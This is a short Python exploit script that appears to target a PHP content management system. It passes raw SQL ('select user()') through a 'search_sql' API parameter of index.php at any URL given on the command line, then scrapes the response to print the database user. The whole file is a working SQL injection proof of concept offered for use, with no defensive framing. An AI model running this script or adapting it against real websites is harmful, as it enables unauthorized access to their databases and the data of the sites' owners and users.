#!/usr/bin/dev python
# -*- coding:utf-8 -*-
# author: Lion Ei'Jonson
# date:2017/11/20

import sys
import requests
import re
import urllib

def useage():
	print("[*]Usage: python %s http://www.lioneijonson.cn" % sys.argv[0])

def get_result(url):
	payload = "select user()"
	get_params = {
		'c':'Api',
		'm':'html',
		'name':'search',
		'format':'html',
		'params':"{\"search_sql\":" + "\"" + payload + "as title\"}",
	}
	respon = requests.get(url,params=get_params)
	return respon

if __name__ == '__main__':
	if len(sys.argv) != 2:
		useage()
		sys.exit()
	if(sys.argv[1][:4]) != "http":
		url = "http://" + sys.argv[1] + "/index.php"
	else:
		url = sys.argv[1] + "/index.php"
	match = re.search(r"<a href=\"\">(.*?)</a>",get_result(url).content.decode('utf-8'))
	if match:
		print(match.group(1))
	else:
		print("[!]The target is not vnlnerable")
		sys.exit()